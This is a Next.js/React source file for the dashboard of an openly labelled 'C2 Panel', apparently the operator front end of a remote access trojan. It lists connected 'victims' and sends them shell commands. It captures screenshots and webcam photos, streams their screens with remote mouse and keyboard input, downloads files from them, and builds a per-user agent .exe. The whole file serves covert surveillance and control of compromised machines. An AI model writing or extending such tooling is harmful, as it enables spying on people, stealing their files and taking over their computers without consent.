"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import {
  Badge,
  Button,
  CounterBadge,
  Input,
  Spinner,
  Text,
  makeStyles,
  tokens,
} from "@fluentui/react-components";
import {
  DesktopRegular,
  SearchRegular,
  SettingsRegular,
  ChevronLeftRegular,
  ArrowDownloadRegular,
  TargetRegular,
} from "@fluentui/react-icons";
import { VictimCard } from "@/components/ui/VictimCard";
import { Terminal } from "@/components/ui/Terminal";
import { ConnectionBadge } from "@/components/ui/ConnectionBadge";
import { LogoutDialog } from "@/components/ui/LogoutDialog";
import { getVictims, sendCommand, disconnectVictim, downloadMyAgent } from "@/lib/api";
import { useWebSocket } from "@/lib/websocket";
import { useAuth } from "@/lib/auth";
import { useBreakpoint } from "@/lib/useBreakpoint";
import type { Victim } from "@/lib/types";

const useStyles = makeStyles({
  root: {
    display: "flex",
    flexDirection: "column",
    height: "100%",
    backgroundColor: tokens.colorNeutralBackground1,
    overflow: "hidden",
  },
  header: {
    display: "flex",
    alignItems: "center",
    justifyContent: "space-between",
    padding: "10px 20px",
    backgroundColor: tokens.colorNeutralBackground2,
    borderBottom: `1px solid ${tokens.colorNeutralStroke2}`,
    flexShrink: 0,
    gap: "12px",
  },
  headerLeft: {
    display: "flex",
    alignItems: "center",
    gap: "10px",
    minWidth: 0,
  },
  headerRight: {
    display: "flex",
    alignItems: "center",
    gap: "10px",
    flexShrink: 0,
  },
  statsBar: {
    display: "flex",
    alignItems: "center",
    gap: "20px",
    padding: "8px 20px",
    backgroundColor: tokens.colorNeutralBackground3,
    borderBottom: `1px solid ${tokens.colorNeutralStroke2}`,
    flexShrink: 0,
  },
  statItem: {
    display: "flex",
    alignItems: "center",
    gap: "6px",
  },
  body: {
    display: "flex",
    flex: 1,
    overflow: "hidden",
  },
  sidebar: {
    width: "300px",
    flexShrink: 0,
    backgroundColor: tokens.colorNeutralBackground2,
    borderRight: `1px solid ${tokens.colorNeutralStroke2}`,
    display: "flex",
    flexDirection: "column",
    overflow: "hidden",
  },
  sidebarMobile: {
    width: "100%",
    flex: 1,
  },
  sidebarHeader: {
    padding: "10px 12px",
    borderBottom: `1px solid ${tokens.colorNeutralStroke2}`,
    display: "flex",
    flexDirection: "column",
    gap: "8px",
  },
  sidebarTitleRow: {
    display: "flex",
    alignItems: "center",
    justifyContent: "space-between",
  },
  sidebarList: {
    flex: 1,
    overflowY: "auto",
    padding: "8px",
    display: "flex",
    flexDirection: "column",
    gap: "6px",
  },
  main: {
    flex: 1,
    padding: "16px",
    overflow: "hidden",
    display: "flex",
    flexDirection: "column",
  },
  empty: {
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    justifyContent: "center",
    height: "100%",
    gap: "16px",
    color: tokens.colorNeutralForeground4,
  },
  backButton: {
    marginBottom: "8px",
    alignSelf: "flex-start",
    flexShrink: 0,
  },
});

interface DashboardContainerProps {
  initialVictims?: Victim[];
}

export function DashboardContainer({
  initialVictims = [],
}: DashboardContainerProps) {
  const [victims, setVictims] = useState<Victim[]>(initialVictims);
  const [selected, setSelected] = useState<Victim | null>(null);
  const [output, setOutput] = useState<string[]>([]);
  const [liveViewActive, setLiveViewActive] = useState(false);
  const [liveFrame, setLiveFrame] = useState<string | null>(null);
  const [loading, setLoading] = useState(initialVictims.length === 0);
  const [search, setSearch] = useState("");
  const hasInitialData = useRef(initialVictims.length > 0);

  const styles = useStyles();
  const { user, token, logout, isLoading } = useAuth();
  const { isMobile } = useBreakpoint();
  const router = useRouter();

  const wsBase = process.env.NEXT_PUBLIC_WS_URL ?? "ws://localhost:8080/ws";
  const wsUrl = token ? `${wsBase}?token=${encodeURIComponent(token)}` : wsBase;
  const { lastMessage, connected } = useWebSocket(wsUrl);

  const loadVictims = useCallback(async () => {
    try {
      const data = await getVictims(token ?? undefined);
      setVictims(data);
    } catch {
      // silently retry on next interval
    } finally {
      setLoading(false);
    }
  }, [token]);

  useEffect(() => {
    if (!hasInitialData.current) loadVictims();
    const t = setInterval(loadVictims, 5000);
    return () => clearInterval(t);
  }, [loadVictims]);

  useEffect(() => {
    if (!lastMessage) return;
    try {
      const msg = JSON.parse(lastMessage);
      if (
        msg.type === "victim_connected" ||
        msg.type === "victim_disconnected"
      ) {
        loadVictims();
        if (msg.type === "victim_disconnected" && selected?.id === msg.id) {
          setSelected(null);
          setOutput((p) => [...p, `[!] Session ${msg.id} closed by remote`]);
        }
      } else if (msg.type === "shell_output") {
        setOutput((p) => [...p, msg.output ?? ""]);
      } else if (msg.type === "screenshot_result") {
        if (msg.error) {
          setOutput((p) => [...p, `[screenshot error] ${msg.error}`]);
        } else {
          setOutput((p) => [
            ...p,
            `[screenshot] Captured from ${msg.id}`,
            `%%IMG%%${msg.data}`,
          ]);
        }
      } else if (msg.type === "download_result") {
        if (msg.error) {
          setOutput((p) => [...p, `[download error] ${msg.error}`]);
        } else {
          setOutput((p) => [
            ...p,
            `[file] ${msg.filename} (${msg.size} bytes)`,
            `%%FILE%%${msg.filename}%%${msg.data}`,
          ]);
        }
      } else if (msg.type === "webcam_result") {
        if (msg.error) {
          setOutput((p) => [...p, `[webcam error] ${msg.error}`]);
        } else {
          setOutput((p) => [
            ...p,
            `[webcam] Captured from ${msg.id}`,
            `%%IMG%%${msg.data}`,
          ]);
        }
      } else if (msg.type === "screen_frame") {
        if (!msg.error) {
          setLiveFrame(msg.data ?? null);
        }
      }
    } catch {}
  }, [lastMessage, loadVictims, selected]);

  useEffect(() => {
    if (!isLoading && !user) router.push("/login");
  }, [user, isLoading, router]);

  function handleSelect(victim: Victim) {
    setSelected(victim);
    setOutput([]);
    setLiveViewActive(false);
    setLiveFrame(null);
  }

  async function handleRemoteInput(action: string, x: number, y: number, key?: string) {
    if (!selected) return;
    const payload = JSON.stringify({ action, x, y, key: key ?? "", button: "left" });
    try {
      await sendCommand(selected.id, payload, token ?? undefined, "remote_input");
    } catch {}
  }

  async function handleCommand(cmd: string) {
    if (!selected) return;
    setOutput((p) => [...p, `$ ${cmd}`]);

    // Parse special commands
    const trimmed = cmd.trim().toLowerCase();
    let commandType = "shell";
    let payload = cmd;

    if (trimmed === "cmds" || trimmed === "help" || trimmed === "?") {
      setOutput((p) => [
        ...p,
        "┌──────────────────────────────────────────────────────┐",
        "│                  Available Commands                  │",
        "├──────────────────────────────────────────────────────┤",
        "│  Shell                                               │",
        "│    <any command>     Run a shell command (cmd/bash)   │",
        "│    cd <path>         Change working directory         │",
        "│                                                      │",
        "│  Recon                                                │",
        "│    screenshot        Capture screen (PNG)             │",
        "│    webcam            Capture webcam photo (PNG)       │",
        "│                                                      │",
        "│  Streaming                                            │",
        "│    liveview          Toggle live screen stream (JPEG) │",
        "│                      Click on stream to send input    │",
        "│                                                      │",
        "│  File Transfer                                        │",
        "│    download <path>   Download a file from victim      │",
        "│                                                      │",
        "│  Meta                                                 │",
        "│    cmds / help / ?   Show this help message           │",
        "└──────────────────────────────────────────────────────┘",
      ]);
      return;
    } else if (trimmed === "screenshot") {
      commandType = "screenshot";
      payload = "";
    } else if (trimmed === "webcam") {
      commandType = "webcam";
      payload = "";
    } else if (trimmed === "liveview" || trimmed === "live") {
      if (liveViewActive) {
        commandType = "screen_stream_stop";
        payload = "";
        setLiveViewActive(false);
        setLiveFrame(null);
        setOutput((p) => [...p, "[live view] Stopped"]);
      } else {
        commandType = "screen_stream_start";
        payload = "";
        setLiveViewActive(true);
        setOutput((p) => [...p, "[live view] Starting... Type 'liveview' again to stop"]);
      }
    } else if (trimmed.startsWith("download ")) {
      commandType = "download";
      payload = cmd.trim().substring(9);
    }

    try {
      await sendCommand(selected.id, payload, token ?? undefined, commandType);
    } catch {
      setOutput((p) => [...p, "[error] Command delivery failed"]);
    }
  }

  async function handleDisconnect(victim: Victim) {
    try {
      await disconnectVictim(victim.id, token ?? undefined);
    } catch {}
    if (selected?.id === victim.id) {
      setSelected(null);
      setOutput([]);
    }
  }

  const filteredVictims = victims.filter((v) => {
    if (!search) return true;
    const q = search.toLowerCase();
    const ip = v.id.split(":")[0];
    const hostname = v.info.hostname || v.info.host || ip;
    const username = v.info.username || v.info.user || "";
    const os = v.info.os || v.info.platform || "";
    return (
      v.id.toLowerCase().includes(q) ||
      hostname.toLowerCase().includes(q) ||
      username.toLowerCase().includes(q) ||
      os.toLowerCase().includes(q)
    );
  });

  if (isLoading) {
    return (
      <div
        style={{
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          height: "100vh",
        }}
      >
        <Spinner size="large" />
      </div>
    );
  }

  if (!user) return null;

  // On mobile: show sidebar when nothing selected, terminal when selected
  const showSidebar = !isMobile || !selected;
  const showTerminal = !isMobile || !!selected;

  return (
    <div className={styles.root}>
      {/* Header */}
      <div className={styles.header}>
        <div className={styles.headerLeft}>
          <Text size={500} weight="semibold" style={{ whiteSpace: "nowrap" }}>
            <TargetRegular style={{ fontSize: "20px", marginRight: "4px" }} /> C2 Panel
          </Text>
        </div>
        <div className={styles.headerRight}>
          <ConnectionBadge connected={connected} />
          {!isMobile && (
            <Badge appearance="filled" color="brand">
              {user.username}
            </Badge>
          )}
          {!isMobile && user.role && (
            <Badge appearance="tint" color={user.role === "admin" ? "important" : "informative"}>
              {user.role}
            </Badge>
          )}
          {user.role === "admin" && (
            <Button
              appearance="subtle"
              size="small"
              icon={<SettingsRegular />}
              onClick={() => router.push("/admin")}
            >
              {!isMobile ? "Admin" : undefined}
            </Button>
          )}
          <Button
            appearance="subtle"
            size="small"
            icon={<ArrowDownloadRegular />}
            onClick={async () => {
              if (!token) return;
              try {
                const blob = await downloadMyAgent(token);
                const url = URL.createObjectURL(blob);
                const a = document.createElement("a");
                a.href = url;
                a.download = `agent-${user.username}.exe`;
                a.click();
                URL.revokeObjectURL(url);
              } catch {
                alert("Failed to build agent. Try again.");
              }
            }}
          >
            {!isMobile ? "My Agent" : undefined}
          </Button>
          <LogoutDialog onConfirm={logout} showLabel={!isMobile} />
        </div>
      </div>

      {/* Stats bar */}
      <div className={styles.statsBar}>
        <div className={styles.statItem}>
          <DesktopRegular
            fontSize={14}
            color={tokens.colorNeutralForeground2}
          />
          <Text size={200} color="neutral">
            Sessions
          </Text>
          <CounterBadge
            count={victims.length}
            color={victims.length > 0 ? "danger" : "informative"}
            size="small"
          />
        </div>
        <div className={styles.statItem}>
          <Text size={200} color="neutral">
            Active
          </Text>
          <CounterBadge count={victims.length} color="brand" size="small" />
        </div>
        {selected && (
          <div className={styles.statItem}>
            <Text size={200} color="neutral">
              Session
            </Text>
            <Text
              size={200}
              style={{
                fontFamily: "monospace",
                color: tokens.colorBrandForeground1,
                maxWidth: isMobile ? "120px" : "250px",
                overflow: "hidden",
                textOverflow: "ellipsis",
                whiteSpace: "nowrap",
              }}
            >
              {selected.id}
            </Text>
          </div>
        )}
      </div>

      {/* Body */}
      <div className={styles.body}>
        {/* Sidebar */}
        {showSidebar && (
          <div
            className={`${styles.sidebar} ${isMobile ? styles.sidebarMobile : ""}`}
          >
            <div className={styles.sidebarHeader}>
              <div className={styles.sidebarTitleRow}>
                <Text weight="semibold" size={300}>
                  Connected Victims
                </Text>
                {loading && <Spinner size="tiny" />}
              </div>
              <Input
                size="small"
                placeholder="Search victims…"
                contentBefore={<SearchRegular fontSize={14} />}
                value={search}
                onChange={(_, d) => setSearch(d.value)}
              />
            </div>
            <div className={styles.sidebarList}>
              {!loading && filteredVictims.length === 0 ? (
                <Text
                  size={200}
                  style={{
                    color: tokens.colorNeutralForeground4,
                    textAlign: "center",
                    padding: "24px 0",
                  }}
                >
                  {search
                    ? "No victims match your search"
                    : "Waiting for victims…"}
                </Text>
              ) : (
                filteredVictims.map((v) => (
                  <VictimCard
                    key={v.id}
                    victim={v}
                    selected={selected?.id === v.id}
                    onSelect={handleSelect}
                    onDisconnect={handleDisconnect}
                  />
                ))
              )}
            </div>
          </div>
        )}

        {/* Terminal / main pane */}
        {showTerminal && (
          <div className={styles.main}>
            {isMobile && selected && (
              <Button
                className={styles.backButton}
                appearance="subtle"
                size="small"
                icon={<ChevronLeftRegular />}
                onClick={() => setSelected(null)}
              >
                Back to list
              </Button>
            )}
            {selected ? (
              <Terminal
                victim={selected}
                output={output}
                onCommand={handleCommand}
                onClear={() => setOutput([])}
                liveViewActive={liveViewActive}
                liveFrame={liveFrame}
                onRemoteInput={handleRemoteInput}
              />
            ) : (
              <div className={styles.empty}>
                <DesktopRegular
                  fontSize={48}
                  color={tokens.colorNeutralStroke1}
                />
                <Text size={400}>Select a session to open the terminal</Text>
                <Text size={200}>
                  Choose a victim from the sidebar to begin
                </Text>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
